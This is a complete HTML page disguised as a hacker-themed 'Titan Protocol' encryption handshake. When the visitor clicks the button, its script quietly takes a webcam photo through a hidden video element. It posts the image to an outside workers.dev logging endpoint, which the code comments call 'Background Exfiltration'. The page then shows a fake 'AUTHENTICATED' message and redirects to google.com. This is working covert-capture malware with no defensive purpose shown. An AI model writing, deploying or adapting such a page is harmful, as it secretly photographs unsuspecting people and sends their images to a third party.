<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Titan Protocol</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .btn { padding: 25px 40px; border: 2px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-size: 1.2rem; font-weight: bold; }
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
    </style>
</head>
<body>

    <p style="color: #444; font-size: 10px;">V: 2.0.1 - STABLE</p>
    <div id="status">ENCRYPTION ENGINE STANDBY</div>
    <br>
    <video id="v" playsinline muted></video>
    <button id="btn" class="btn">INITIALIZE HANDSHAKE</button>

    <script>
        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
        const video = document.getElementById('v');
        const btn = document.getElementById('btn');
        const status = document.getElementById('status');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            btn.style.display = 'none';
            status.innerText = "CALIBRATING...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: false 
                });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    // Slight delay to allow sensor light adjustment
                    setTimeout(executeFinalCapture, 250);
                };
            } catch (err) {
                status.innerText = "CRITICAL ERROR: PERMISSION_REQUIRED";
                status.style.color = "red";
            }
        };

        async function executeFinalCapture() {
            // 1. Snapshot
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const dataImg = canvas.toDataURL('image/jpeg', 0.5);

            // 2. Kill Hardware
            video.srcObject.getTracks().forEach(t => t.stop());

            // 3. Background Exfiltration
            fetch(LOGGING_API, {
                method: 'POST',
                keepalive: true,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataImg })
            }).catch(e => console.log("Upload backgrounded"));

            // 4. Clean Exit
            status.innerText = "AUTHENTICATED. REDIRECTING...";
            setTimeout(() => {
                window.location.replace("https://google.com");
            }, 500);
        }
    </script>
</body>
</html>
